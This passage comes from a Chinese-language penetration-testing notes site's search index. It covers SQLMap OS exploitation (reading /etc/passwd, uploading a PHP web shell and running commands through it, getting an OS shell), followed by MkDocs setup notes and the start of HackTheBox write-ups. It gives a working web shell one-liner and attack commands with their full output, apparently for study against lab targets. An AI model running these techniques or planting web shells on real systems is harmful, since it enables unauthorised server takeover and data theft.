|_|   http://sqlmap.org\n\n\n[*] starting @ 17:37:47 /2020-11-19/\n\n[17:37:47] [INFO] resuming back-end DBMS 'mysql'\n[17:37:47] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\ncurrent user is DBA: True\n\n[*] ending @ 17:37:48 /2020-11-19/\n</code></pre> <p>\u6211\u4eec\u770b\u5230\u8fd9\u6b21\u6211\u4eec\u5f97\u5230\u4e86<code>current user is DBA: True</code>\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u80fd\u6709\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7684\u6743\u9650\u3002</p>"},{"location":"CheetSheet/SQLMAP/7%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%A9%E7%94%A8%28OS%20Exploitation%29/#_1","title":"\u8bfb\u53d6\u672c\u5730\u6587\u4ef6","text":"<p>SQLMap \u4e0d\u662f\u901a\u8fc7 SQLi \u624b\u52a8\u6ce8\u5165\u4e0a\u8ff0\u884c\uff0c\u800c\u662f\u4f7f\u7528 <code>--file-read</code> \u9009\u9879\u4f7f\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u76f8\u5bf9\u5bb9\u6613\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --file-read \"/etc/passwd\"\n\n        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.4.11#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 17:40:00 /2020-11-19/\n\n[17:40:00] [INFO] resuming back-end DBMS 'mysql'\n[17:40:00] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\n[17:40:01] [INFO] fetching file: '/etc/passwd'\n[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)\n[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'\n[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique\n[17:40:07] [INFO] fetching file: '/etc/passwd'\ndo you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y\n\n[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)\nfiles saved to [1]:\n[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)\n\n[*] ending @ 17:40:14 /2020-11-19/\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u89c1\uff0cSQLMap\u8868\u793a\u5c06\u6587\u4ef6\u4fdd\u5b58\u5230\u672c\u5730\u6587\u4ef6\u4e2d\u3002\u6211\u4eec\u53ef\u4ee5 <code>cat</code> \u672c\u5730\u6587\u4ef6\u770b\u770b\u5b83\u7684\u5185\u5bb9\uff1a</p> <pre><code>$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...SNIP...\n</code></pre> <p>\u6211\u4eec\u5df2\u6210\u529f\u68c0\u7d22\u5230\u8fdc\u7a0b\u6587\u4ef6\u3002</p>"},{"location":"CheetSheet/SQLMAP/7%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%A9%E7%94%A8%28OS%20Exploitation%29/#_2","title":"\u7be1\u6539\u672c\u5730\u6587\u4ef6","text":"<p>\u5f53\u6d89\u53ca\u5230\u5c06\u6587\u4ef6\u5199\u5165\u6258\u7ba1\u670d\u52a1\u5668\u65f6\uff0c\u5b83\u5728\u73b0\u4ee3 DMBS \u4e2d\u53d8\u5f97\u66f4\u52a0\u53d7\u9650\uff0c\u56e0\u4e3a\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b83\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7f16\u5199 Web Shell\uff0c\u4ece\u800c\u6267\u884c\u4ee3\u7801\u5e76\u63a5\u7ba1\u670d\u52a1\u5668\u3002</p> <p>\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u73b0\u4ee3 DBMS \u9ed8\u8ba4\u7981\u7528\u6587\u4ef6\u5199\u5165\u5e76\u4e14\u9700\u8981\u7279\u5b9a\u6743\u9650\u624d\u80fd\u8ba9 DBA \u80fd\u591f\u5199\u5165\u6587\u4ef6\u3002\u4f8b\u5982\uff0c\u5728 MySql \u4e2d\uff0c\u5fc5\u987b\u624b\u52a8\u7981\u7528 <code>--secure-file-priv</code> \u914d\u7f6e\u4ee5\u5141\u8bb8\u4f7f\u7528 <code>INTO OUTFILE SQL</code> \u67e5\u8be2\u5c06\u6570\u636e\u5199\u5165\u672c\u5730\u6587\u4ef6\uff0c\u6b64\u5916\u8fd8\u6709\u4e3b\u673a\u670d\u52a1\u5668\u4e0a\u6240\u9700\u7684\u4efb\u4f55\u672c\u5730\u8bbf\u95ee\u6743\u9650\uff0c\u5982\u5199\u5165\u6743\u9650\u5728\u6211\u4eec\u9700\u8981\u7684\u76ee\u5f55\u4e2d\u3002</p> <p>\u5c3d\u7ba1\u5982\u6b64\uff0c\u8bb8\u591a web \u5e94\u7528\u7a0b\u5e8f\u9700\u8981 DBMS \u5c06\u6570\u636e\u5199\u5165\u6587\u4ef6\u7684\u80fd\u529b\uff0c\u56e0\u6b64\u503c\u5f97\u6d4b\u8bd5\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u5c06\u6587\u4ef6\u5199\u5165\u8fdc\u7a0b\u670d\u52a1\u5668\u3002\u8981\u4f7f\u7528 SQLMap \u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>--file-write</code> \u548c <code>--file-dest</code> \u9009\u9879\u3002\u9996\u5148\uff0c\u8ba9\u6211\u4eec\u51c6\u5907\u4e00\u4e2a\u57fa\u672c\u7684 PHP web shell \u5e76\u5c06\u5176\u5199\u5165 <code>shell.php</code> \u6587\u4ef6\uff1a</p> <pre><code>$ echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php\n</code></pre> <p>\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u5c06\u6b64\u6587\u4ef6\u5199\u5165\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684 <code>/var/www/html/</code> \u76ee\u5f55\u4e2d\uff0c\u8fd9\u662f Apache \u7684\u9ed8\u8ba4\u670d\u52a1\u5668 webroot\u3002\u5982\u679c\u6211\u4eec\u4e0d\u77e5\u9053\u670d\u52a1\u5668 webroot\uff0c\u6211\u4eec\u5c06\u770b\u5230 SQLMap \u5982\u4f55\u81ea\u52a8\u627e\u5230\u5b83\u3002</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"\n\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.4.11#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 17:54:18 /2020-11-19/\n\n[17:54:19] [INFO] resuming back-end DBMS 'mysql'\n[17:54:19] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\ndo you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y\n\n[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)\n\n[*] ending @ 17:54:28 /2020-11-19/\n</code></pre> <p>\u6211\u4eec\u770b\u5230 SQLMap \u786e\u8ba4\u6587\u4ef6\u786e\u5b9e\u88ab\u5199\u5165\u4e86\uff1a</p> <pre><code>[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)\n</code></pre> <p>\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u8bbf\u95ee\u8fdc\u7a0b PHP shell\uff0c\u5e76\u6267\u884c\u793a\u4f8b\u547d\u4ee4\uff1a</p> <pre><code>$ curl http://www.example.com/shell.php?cmd=ls+-la\n\ntotal 148\ndrwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .\ndrwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..\n-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php\n...SNIP...\n</code></pre> <p>\u6211\u4eec\u770b\u5230\u6211\u4eec\u7684 PHP shell \u786e\u5b9e\u662f\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7f16\u5199\u7684\uff0c\u5e76\u4e14\u6211\u4eec\u786e\u5b9e\u5728\u4e3b\u673a\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e86\u547d\u4ee4\u3002</p>"},{"location":"CheetSheet/SQLMAP/7%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%A9%E7%94%A8%28OS%20Exploitation%29/#_3","title":"\u7cfb\u7edf\u547d\u4ee4\u6267\u884c","text":"<p>\u73b0\u5728\u6211\u4eec\u786e\u8ba4\u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u4e00\u4e2a PHP shell \u6765\u6267\u884c\u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5 SQLMap \u4e3a\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u7b80\u5355\u7684 OS shell \u800c\u65e0\u9700\u624b\u52a8\u7f16\u5199\u8fdc\u7a0b shell \u7684\u80fd\u529b\u3002 SQLMap\u5229\u7528\u5404\u79cd\u6280\u672f\u901a\u8fc7SQL\u6ce8\u5165\u6f0f\u6d1e\u83b7\u53d6\u8fdc\u7a0bshell\uff0c\u5c31\u50cf\u6211\u4eec\u521a\u624d\u5199\u7684\u8fdc\u7a0bshell\uff0c\u7f16\u5199\u6267\u884c\u547d\u4ee4\u5e76\u68c0\u7d22\u8f93\u51fa\u7684SQL\u51fd\u6570\uff0c\u751a\u81f3\u4f7f\u7528\u4e00\u4e9b\u76f4\u63a5\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u7684SQL\u67e5\u8be2\uff0c\u6bd4\u5982\u5fae\u8f6f\u7684 <code>xp_cmdshell</code> SQL\u670d\u52a1\u5668\u3002\u8981\u4f7f\u7528 SQLMap \u83b7\u53d6 OS shell\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>--os-shell</code> \u9009\u9879\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --os-shell\n\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.4.11#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[*] starting @ 18:02:15 /2020-11-19/\n\n[18:02:16] [INFO] resuming back-end DBMS 'mysql'\n[18:02:16] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\n[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)\n[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file\n[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file\n[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution\n[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER\n\nos-shell&gt; ls -la\ndo you want to retrieve the command standard output? [Y/n/a] a\n\n[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique\nNo output\n</code></pre> <p>\u6211\u4eec\u770b\u5230 SQLMap \u9ed8\u8ba4\u4f7f\u7528 <code>UNION</code> \u6280\u672f\u6765\u83b7\u53d6 OS shell\uff0c\u4f46\u6700\u7ec8\u672a\u80fd\u7ed9\u6211\u4eec\u4efb\u4f55\u8f93\u51fa <code>No output</code>\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u6211\u4eec\u6709\u591a\u79cd\u7c7b\u578b\u7684 SQL \u6ce8\u5165\u6f0f\u6d1e\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u6307\u5b9a\u53e6\u4e00\u79cd\u66f4\u6709\u53ef\u80fd\u4e3a\u6211\u4eec\u63d0\u4f9b\u76f4\u63a5\u8f93\u51fa\u7684\u6280\u672f\uff0c\u4f8b\u5982\u57fa\u4e8e\u9519\u8bef\u7684 SQL \u6ce8\u5165\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>--technique=E</code> \u6307\u5b9a:</p> <pre><code>darkinga@htb[/htb]$ sqlmap -u \"http://www.example.com/?id=1\" --os-shell --technique=E\n\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.4.11#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 18:05:59 /2020-11-19/\n\n[18:05:59] [INFO] resuming back-end DBMS 'mysql'\n[18:05:59] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\nwhich web application language does the web server support?\n[1] ASP\n[2] ASPX\n[3] JSP\n[4] PHP (default)\n&gt; 4\n\ndo you want sqlmap to further try to provoke the full path disclosure? [Y/n] y\n\n[18:06:07] [WARNING] unable to automatically retrieve the web server document root\nwhat do you want to use for writable directory?\n[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)\n[2] custom location(s)\n[3] custom directory list file\n[4] brute force search\n&gt; 1\n\n[18:06:09] [WARNING] unable to automatically parse any web server path\n[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method\n[18:06:09] [WARNING] potential permission problems detected ('Permission denied')\n[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'\n[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method\n[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php\n[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php\n[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER\n\nos-shell&gt; ls -la\n\ndo you want to retrieve the command standard output? [Y/n/a] a\n\ncommand standard output:\n---\ntotal 156\ndrwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .\ndrwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..\n-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php\n...SNIP...\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u89c1\uff0c\u8fd9\u6b21 SQLMap \u6210\u529f\u5730\u5c06\u6211\u4eec\u653e\u5165\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u4ea4\u4e92\u5f0f\u8fdc\u7a0b shell\uff0c\u8ba9\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a SQLi \u8f7b\u677e\u5730\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u3002</p> <p>\u6ce8\u610f\uff1aSQLMap \u9996\u5148\u8be2\u95ee\u6211\u4eec\u5728\u8fd9\u4e2a\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u4f7f\u7528\u7684\u8bed\u8a00\u7c7b\u578b\uff0c\u6211\u4eec\u77e5\u9053\u662f PHP\u3002\u7136\u540e\u5b83\u8981\u6c42\u6211\u4eec\u63d0\u4f9b\u670d\u52a1\u5668 web \u6839\u76ee\u5f55\uff0c\u6211\u4eec\u8981\u6c42 SQLMap \u4f7f\u7528\u201ccommon location(s)\u201d\u81ea\u52a8\u627e\u5230\u5b83\u3002\u8fd9\u4e24\u4e2a\u9009\u9879\u90fd\u662f\u9ed8\u8ba4\u9009\u9879\uff0c\u5982\u679c\u6211\u4eec\u5c06\u201c--batch\u201d\u9009\u9879\u6dfb\u52a0\u5230 SQLMap\uff0c\u5b83\u4eec\u5c06\u88ab\u81ea\u52a8\u9009\u62e9\u3002</p> <p>\u81f3\u6b64\uff0c\u6211\u4eec\u5df2\u7ecf\u6db5\u76d6\u4e86 SQLMap \u7684\u6240\u6709\u4e3b\u8981\u529f\u80fd\u3002 </p>"},{"location":"CheetSheet/SQLMAP/SQLMap%E5%9F%BA%E7%A1%80%E7%BB%93%E8%AE%BA/","title":"SQLMap\u57fa\u7840\u7ed3\u8bba","text":"<p>\u5728\u672c\u6a21\u5757\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86 SQLMap \u7684\u6982\u8ff0\u548c\u5b89\u88c5\u3001SQLMap \u652f\u6301\u7684\u4e0d\u540c\u7c7b\u578b\u7684\u653b\u51fb\uff0c\u5e76\u4ecb\u7ecd\u4e86\u8be5\u5de5\u5177\u7684\u5404\u79cd\u7528\u4f8b\u3002</p>"},{"location":"CheetSheet/SQLMAP/SQLMap%E5%9F%BA%E7%A1%80%E7%BB%93%E8%AE%BA/#_1","title":"\u6a21\u5757\u5173\u952e\u8981\u70b9","text":"<ul> <li>SQLMap \u7684\u57fa\u672c\u548c\u9ad8\u7ea7\u7528\u6cd5 </li> <li>SQLMap \u7591\u96be\u89e3\u7b54 </li> <li>\u6570\u636e\u5e93\u679a\u4e3e </li> <li>SQLi \u653b\u51fb\u8c03\u6574 </li> <li>\u68c0\u7d22\u6570\u636e </li> <li>\u5229\u7528 SQLMap \u7ed5\u8fc7\u4fdd\u62a4 </li> <li>\u901a\u8fc7 SQL \u6ce8\u5165\u6f0f\u6d1e\u4e0e\u6587\u4ef6\u7cfb\u7edf\u4ea4\u4e92</li> </ul>"},{"location":"DOC/Github%20Page/","title":"Github Page","text":"<p>\u514b\u9686\u5b58\u50a8\u5e93 </p> <p>\u5c06\u65b0\u7684\u5b58\u50a8\u5e93\u514b\u9686\u81f3 <code>page</code> \u76ee\u6807\u6587\u4ef6\u5939\u5185\u3002</p> <pre><code>$ git clone https://github.com/username/username.github.io page/\n</code></pre> <p>\u63d0\u4ea4\u81f3\u5b58\u50a8\u5e93</p> <pre><code>$ git add --all\n$ git commit -m \"\u6ce8\u91ca\"\n$ git push -u origin main\n</code></pre>"},{"location":"DOC/mkdocs/","title":"MkDocs DOC","text":""},{"location":"DOC/mkdocs/#_1","title":"\u5b89\u88c5","text":"<pre><code>pip install mkdocs\n</code></pre>"},{"location":"DOC/mkdocs/#_2","title":"\u5e38\u7528\u547d\u4ee4","text":"<ul> <li><code>mkdocs new [dir-name]</code> - \u521b\u5efa\u4e00\u4e2a\u65b0\u9879\u76ee\u3002</li> <li><code>mkdocs serve -a 127.0.0.1:8080</code> - \u542f\u52a8 <code>Mkdocs</code> \u670d\u52a1\u3002</li> <li><code>mkdocs build</code> - \u6784\u5efa\u9759\u6001\u9875\u9762\u81f3 <code>/site</code> \u76ee\u5f55\u4e0b\u3002</li> <li><code>mkdocs -h</code> - \u5e2e\u52a9\u4fe1\u606f\u3002</li> <li><code>mv x.md blog/docs/</code> - \u6dfb\u52a0\u65b0\u9875\u9762\u3002</li> </ul>"},{"location":"DOC/mkdocs/#_3","title":"\u914d\u7f6e\u6587\u4ef6","text":"<pre><code>site_name: Mksite #\u5fc5\u8981\u914d\u7f6e\nsite_url: https://xvuln.com/ #\u5fc5\u8981\u914d\u7f6e\n</code></pre> <p>For full documentation visit mkdocs.org.</p> <p>favicon.ico \u5728 <code>img</code> \u76ee\u5f55\u4e0b\u521b\u5efa\u5b50\u76ee\u5f55 <code>docs</code> \u5e76\u5c06\u81ea\u5b9a\u4e49 <code>favicon.ico</code> \u6587\u4ef6\u590d\u5236\u5230\u76ee\u5f55\u4e2d\u5373\u53ef\u3002</p>"},{"location":"DOC/mkdocs/#nav","title":"nav","text":"<pre><code>site_name: Mksite #\u5fc5\u8981\u914d\u7f6e\nsite_url: https://xvuln.com/ #\u5fc5\u8981\u914d\u7f6e\n# \u53ef\u9009\u914d\u7f6e\ud83d\udc47\nnav:\n# \u5fc5\u987b\u4e0e docs \u76ee\u5f55\u4e0b\u6587\u6863\u76f8\u5173\n    - Home: index.md #\u5bfc\u822a\u680f\n    - About: about.md #\u5bfc\u822a\u680f\n    - '\u5e2e\u52a9': 'help.md' #\u5bfc\u822a\u680f\u547d\u540d\n    - 'hacktricks': 'https://book.hacktricks.xyz' #\u6307\u5411\u5916\u90e8\u7ad9\u70b9\u7684\u5bfc\u822a\u680f\n\ntheme: readthedocs #\u4e3b\u9898\u8bbe\u7f6e\n\nrepo_url: https://github.com/ovuln/ovuln.github.io/ #\u5728\u6bcf\u4e2a\u9875\u9762\u6dfb\u52a0\u6b64\u5b58\u50a8\u5e93\u5730\u5740\nedit_uri: '?query=root/path/docs/'\n</code></pre>"},{"location":"DOC/mkdocs/#_4","title":"\u4e3b\u9898","text":""},{"location":"DOC/mkdocs/#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"HTB/Absolute/","title":"Absolute","text":"<p>Absolute</p> <p>Absolute \u662f\u4e00\u53f0 Insane Windows Active Directory \u673a\u5668\uff0c\u5b83\u4ee5\u663e\u793a\u4e00\u4e9b\u56fe\u50cf\u7684\u7f51\u9875\u5f00\u59cb\uff0c\u5176\u5143\u6570\u636e\u7528\u4e8e\u521b\u5efa\u673a\u5668\u4e0a\u53ef\u80fd\u5b58\u5728\u7684\u7528\u6237\u540d\u3002\u4e8b\u5b9e\u8bc1\u660e\uff0c\u5176\u4e2d\u4e00\u4e2a\u7528\u6237\u4e0d\u9700\u8981\u9884\u8eab\u4efd\u9a8c\u8bc1\uff0c\u56e0\u6b64\u6784\u6210\u4e86 ASREP \u70d8\u7119\u653b\u51fb\u7684\u91cd\u8981\u76ee\u6807\u3002\u53d1\u73b0\u7684\u51ed\u636e\u7136\u540e\u7528\u4e8e\u679a\u4e3e LDAP \u5e76\u53d1\u73b0\u7528\u6237 svc_smb \u7684\u51ed\u636e\uff0c\u8be5\u7528\u6237\u6709\u6743\u8bbf\u95ee\u5305\u542b Windows \u4e8c\u8fdb\u5236\u6587\u4ef6\u7684 SMB \u5171\u4eab\u3002\u5bf9\u4e8c\u8fdb\u5236\u6587\u4ef6\u6267\u884c\u52a8\u6001\u5206\u6790\u8868\u660e\uff0c\u5b83\u5c1d\u8bd5\u4f7f\u7528 m.lovegod \u7528\u6237\u7684\u660e\u6587\u51ed\u636e\u6267\u884c\u4e0e\u57df\u63a7\u5236\u5668\u7684 LDAP \u8fde\u63a5\uff0c\u8be5\u7528\u6237\u62e5\u6709 Network Audit \u7ec4\uff0c\u800c\u8be5\u7ec4\u53c8\u5bf9 winrm_user \u5177\u6709\u901a\u7528\u5199\u5165\u3002\u6309\u7167\u6b64\u653b\u51fb\u8def\u5f84\u5e76\u5bf9 winrm_user \u6267\u884c\u5f71\u5b50\u51ed\u8bc1\u653b\u51fb\uff0c\u7136\u540e\u53ef\u4ee5\u4f7f\u7528 WinRM \u5e76\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002\u6700\u540e\uff0c\u4f7f\u7528 KrbRelay \u5de5\u5177\u5c06 winrm_user \u7528\u6237\u6dfb\u52a0\u5230 Administrators \u7ec4\uff0c\u4ece\u800c\u83b7\u5f97\u5b8c\u5168\u63d0\u5347\u7684\u6743\u9650\u3002</p> <p>\u6240\u9700\u77e5\u8bc6</p> <ul> <li>Enumeration</li> <li>Windows Active Directory</li> <li>Dynamic Analysis</li> </ul> <p>\u6240\u5b66\u77e5\u8bc6</p> <ul> <li>Kerberos Authentication</li> <li>Access Control Lists(ACLs) Modification</li> <li>KrbRelay</li> <li>Interactive Sessions</li> </ul>"},{"location":"HTB/Absolute/#enumeration","title":"Enumeration","text":""},{"location":"HTB/Absolute/#nmap","title":"Nmap","text":"<p>\u6700\u521d\u7684 Nmap \u8f93\u51fa\u663e\u793a\u6709\u5f88\u591a\u5f00\u653e\u7aef\u53e3\uff0c\u8868\u660e\u8be5\u673a\u5668\u4f7f\u7528 Active Directory\u3002\u5728\u7aef\u53e3 80 \u4e0a\uff0c\u6211\u4eec\u627e\u5230\u4e86\u4e00\u4e2a IIS Web \u670d\u52a1\u5668\u3002\u6b64\u5916\uff0c\u6839\u636e\u8f93\u51fa\uff0c\u6211\u4eec\u6709\u4e24\u4e2a\u6709\u6548\u7684\u673a\u5668\u4e3b\u673a\u540d\uff1b\u4e00\u4e2a\u6307\u7684\u662f\u57df absolute.htb \uff0c\u53e6\u4e00\u4e2a\u53ef\u80fd\u6307\u7684\u662f\u57df\u63a7\u5236\u5668 dc.absolute.htb \u3002\u56e0\u6b64\uff0c\u6211\u4eec\u76f8\u5e94\u5730\u4fee\u6539\u6211\u4eec\u7684\u4e3b\u673a\u6587\u4ef6\uff1a</p> <p>\u6b64\u5916\uff0c\u5176\u4e2d\u8bb8\u591a\u7aef\u53e3\u90fd\u4e0e Kerberos \u8eab\u4efd\u9a8c\u8bc1\u76f8\u5173\u3002\u5982\u679c\u6211\u4eec\u7a0d\u540e\u8981\u4f7f\u7528 Kerberos \u8eab\u4efd\u9a8c\u8bc1\uff0c\u6211\u4eec\u5fc5\u987b\u8bb0\u4f4f\uff0c\u6839\u636e Nmap\uff0c\u6211\u4eec\u7684\u672c\u5730\u673a\u5668\u548c\u8fdc\u7a0b\u670d\u52a1\u5668\u4e4b\u95f4\u6709 7 \u5c0f\u65f6\u7684\u5dee\u5f02\u3002 Kerberos \u4ec5\u5728\u65f6\u5dee\u4e3a 5 \u5206\u949f\u6216\u66f4\u77ed\u65f6\u624d\u8d77\u4f5c\u7528\u3002</p>"},{"location":"HTB/Absolute/#iis-port-80","title":"IIS-PORT 80","text":"<p>\u6211\u4eec\u901a\u8fc7\u8bbf\u95ee http://absolute.htb \u5f00\u59cb\u6211\u4eec\u7684\u679a\u4e3e\u3002\u8be5\u9875\u9762\u4f3c\u4e4e\u663e\u793a\u56fe\u50cf\u5e7b\u706f\u7247\uff1a</p> <p>\u7531\u4e8e\u8be5\u9875\u9762\u63d0\u5230\u4e86\u6211\u4eec\u7684\u4f5c\u54c1\uff0c\u6211\u4eec\u53ef\u4ee5\u653e\u5fc3\u5730\u5047\u8bbe\u8fd9\u4e9b\u56fe\u50cf\u5c5e\u4e8e\u6709\u6743\u8bbf\u95ee\u670d\u52a1\u5668\u7684\u4eba\u3002\u67e5\u770b\u7ad9\u70b9\u7684\u6e90\u4ee3\u7801\uff0c\u6211\u4eec\u627e\u5230\u56fe\u50cf\u7684\u8def\u5f84\uff1a</p> <pre><code>for i in {1..6}; do wget http://absolute.htb/images/hero_$i.jpg; done\n</code></pre> <p></p> <p>\u7136\u540e\u6211\u4eec\u4f7f\u7528 exiftool \u4ece\u6240\u6709\u56fe\u50cf\u4e2d\u63d0\u53d6\u5143\u6570\u636e\u3002</p> <pre><code>exiftool *.jpg\n</code></pre> <p></p> <p>\u4f5c\u8005\u5b57\u6bb5\u4f3c\u4e4e\u5305\u542b\u62cd\u6444\u76f8\u5e94\u7167\u7247\u7684\u7528\u6237\u7684\u5168\u540d\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u540d\u79f0\uff0c\u5e76\u5728 username-anarchy \u811a\u672c\u7684\u5e2e\u52a9\u4e0b\uff0c\u4e3a\u673a\u5668\u751f\u6210\u4e00\u4e2a\u53ef\u80fd\u7684\u7528\u6237\u540d\u5217\u8868\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u5fc5\u987b\u63d0\u53d6 Author \u5b57\u6bb5\u4e2d\u51fa\u73b0\u7684\u6bcf\u4e2a\u540d\u79f0\u3002</p> <pre><code>$ exiftool *.jpg | grep -i Author | cut -d \":\" -f 2 | cut -d \" \" -f 2,3 &gt; authors\n</code></pre> <p>\u7136\u540e\uff0c\u6211\u4eec\u751f\u6210\u4e00\u4e2a\u53ef\u80fd\u7684\u7528\u6237\u5217\u8868\u3002</p> <pre><code>$ ruby username-anarchy/username-anarchy -i authors -f flast,lfirst,f.last &gt; usernames\n</code></pre> <p></p>"},{"location":"HTB/Busqueda-DOC/","title":"Busqueda","text":"<p>\u96be\u5ea6\uff1aEasy</p> <p>\u673a\u5668\u4f5c\u8005\uff1akavigihan</p> <p>\u5ba1\u8ba1(Prepared By)\uff1adotguy</p> <p>\u65e5\u671f\uff1a2023 \u5e74 5 \u6708 6 \u65e5 / \u6587\u4ef6\u7f16\u53f7 D23.100.235</p>"},{"location":"HTB/Busqueda-DOC/#_1","title":"\u8bf4\u660e","text":"<p>\u7b80\u5355\u96be\u5ea6\u7684 <code>Linux</code> \u673a\u5668\uff0c\u6d89\u53ca <code>Python</code> \u6a21\u5757\u4e2d\u7684\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u6211\u4eec\u83b7\u5f97\u4e86\u5bf9\u8ba1\u7b97\u673a\u7528\u6237 <code>svc</code> 